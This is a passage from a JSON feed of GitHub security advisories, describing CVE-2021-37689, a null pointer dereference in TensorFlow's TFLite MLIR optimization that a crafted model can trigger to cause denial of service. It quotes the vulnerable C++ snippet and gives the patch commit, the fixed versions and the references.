href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow-cpu] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}